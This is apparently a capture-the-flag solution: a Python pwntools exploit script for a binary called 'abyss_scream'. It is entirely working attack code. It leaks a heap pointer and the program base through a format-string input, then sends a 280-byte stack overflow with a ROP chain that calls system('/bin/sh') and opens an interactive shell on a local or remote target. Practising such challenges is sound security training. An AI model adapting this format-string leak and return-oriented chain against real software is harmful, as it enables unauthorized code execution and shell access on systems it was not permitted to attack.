#!/usr/bin/env python3

from pwn import *

exe = ELF("./abyss_scream")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # 0x00000000000013b5: pop rdi; ret;
    # 0x00000000000013b6: ret;

    r.sendlineafter(b"input: ", b"x")
    r.sendlineafter(b"name: ", b"/bin/sh\x00")      # Needed later for "system" call
    
    # 41st argument --> heap allocated string for name
    # 43th argument --> main+128
    r.sendlineafter(b"message: ", b"%41$lx-%43$lx")
    leaks = r.recvlines(2, keepends = False)[-1].split(b"-")

    bin_sh = int(leaks[0], 16)
    exe.address = int(leaks[1], 16) - (exe.symbols["main"] + 128)

    log.info(f"\"/bin/sh\" address: 0x{bin_sh:x}")
    log.info(f"Base address: 0x{exe.address:x}")

    # Give another message
    r.sendlineafter(b"input: ", b"x")
    r.sendlineafter(b"name: ", b"Asdrubale")
    
    payload  = b"A" * 280                       # Padding
    payload += p64(exe.address + 0x13b5)        # Gadget to pop "bin_sh" address into RDI 
    payload += p64(bin_sh)                      # "bin_sh" address (in the heap)
    payload += p64(exe.address + 0x13b6)        # Dummy return address
    payload += p64(exe.plt["system"])           # Call "system"

    r.sendlineafter(b"message: ", payload)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
